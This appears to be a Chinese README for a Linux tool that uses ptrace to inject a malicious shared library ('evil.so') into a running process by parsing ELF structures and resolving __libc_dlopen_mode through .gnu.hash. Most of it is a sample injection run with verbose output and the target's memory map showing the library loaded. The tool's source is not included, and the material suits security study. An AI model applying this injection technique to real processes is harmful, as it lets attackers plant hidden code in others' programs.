## InejctRuntimeELF

Ref: [linux进程动态so注入](https://github.com/jmpews/dev2pwn/blob/master/linux%E8%BF%9B%E7%A8%8B%E5%8A%A8%E6%80%81so%E6%B3%A8%E5%85%A5.md)

实现恶意 `so` 注入, 采用直接解析 `ELF` 文件的方式, 更加具有通用性, 并以 `.gnu.hash` 进行符号查找, 适用于目前的 `ELF` 结构.

代码规范, 参考 `glibc-2.19`, 用 `ElfW` 宏进行 `32` 和 `64` 字长兼容.

#### usage

```
➜  InjectRuntimeELF sudo ./inject 6380 /vagrant/evilELF/InjectRuntimeELF/example/evil.so
[*] attached to pid 6380
[*] dump runtime infomation
[*] header (ignore...)
[*] dynamic:
    dynsym: 0x80481cc
    dynstr: 0x804821c
    gnuhash: 0x80481ac
    nbuckets: 2
    nmaskwords: 1
[*] start search '__libc_dlopen_mode':
[+] search libaray path: /lib/i386-linux-gnu/libc.so.6
[*] start gnu hash search:
    new_hash: 0x80498e8(4073429154)
    n: 197
    hash buckets index: 0x3c6(966), first dynsym index: 0x8f5(2293)
[*] start bucket search:
    h2: 0xd5e07632(3588257330)
    h2: 0xf2cb98a2(4073429154)
[+] Found '__libc_dlopen_mode' at 0xb768fae0
test.1: 134513440
[+] entry point: 0x8048320
[+] stopped 6380 at eip:0xb7725428, esp:0xbfe7202c
[+] inject code done 6380 at eip:0x8048336
[*] start search 'evilfunc':
[+] search libaray path: /lib/i386-linux-gnu/libc.so.6
[*] start gnu hash search:
    new_hash: 0x8049939(701380385)
    n: 441
[+] search libaray path: /lib/ld-linux.so.2
ptrace(PTRACE_PEEKTEXT) failed
[*] start gnu hash search:
    new_hash: 0x8049939(701380385)
    n: 1
[+] search libaray path: /vagrant/evilELF/InjectRuntimeELF/example/evil.so
[*] start gnu hash search:
    new_hash: 0x8049939(701380385)
    n: 1
    hash buckets index: 0x2(2), first dynsym index: 0xb(11)
[*] start bucket search:
    h2: 0x29ce3720(701380384)
[+] Found 'evilfunc' at 0xb772053b
[*] lib injection done!
```

查看pid对应maps可以查看到已经加载了恶意的so

```
➜  InjectRuntimeELF cat /proc/6380/maps
08048000-08049000 r-xp 00000000 00:1a 1097       /vagrant/evilELF/InjectRuntimeELF/example/test_target
08049000-0804a000 r--p 00000000 00:1a 1097       /vagrant/evilELF/InjectRuntimeELF/example/test_target
0804a000-0804b000 rw-p 00001000 00:1a 1097       /vagrant/evilELF/InjectRuntimeELF/example/test_target
09aef000-09b10000 rw-p 00000000 00:00 0          [heap]
b756b000-b756c000 rw-p 00000000 00:00 0
b756c000-b7714000 r-xp 00000000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b7714000-b7715000 ---p 001a8000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b7715000-b7717000 r--p 001a8000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b7717000-b7718000 rw-p 001aa000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b7718000-b771b000 rw-p 00000000 00:00 0
b7720000-b7721000 r-xp 00000000 00:1a 1102       /vagrant/evilELF/InjectRuntimeELF/example/evil.so
b7721000-b7722000 r--p 00000000 00:1a 1102       /vagrant/evilELF/InjectRuntimeELF/example/evil.so
b7722000-b7723000 rw-p 00001000 00:1a 1102       /vagrant/evilELF/InjectRuntimeELF/example/evil.so
b7723000-b7725000 rw-p 00000000 00:00 0
b7725000-b7726000 r-xp 00000000 00:00 0          [vdso]
b7726000-b7746000 r-xp 00000000 08:01 2153       /lib/i386-linux-gnu/ld-2.19.so
b7746000-b7747000 r--p 0001f000 08:01 2153       /lib/i386-linux-gnu/ld-2.19.so
b7747000-b7748000 rw-p 00020000 08:01 2153       /lib/i386-linux-gnu/ld-2.19.so
bfe52000-bfe73000 rw-p 00000000 00:00 0          [stack]
```

#### 参考链接:

[PWN之ELF解析](https://github.com/jmpews/dev2pwn/blob/master/PWN%E4%B9%8BELF%E8%A7%A3%E6%9E%90.md)

[linux进程动态so注入](https://github.com/jmpews/dev2pwn/blob/master/linux%E8%BF%9B%E7%A8%8B%E5%8A%A8%E6%80%81so%E6%B3%A8%E5%85%A5.md)

#### 利用点

TODO

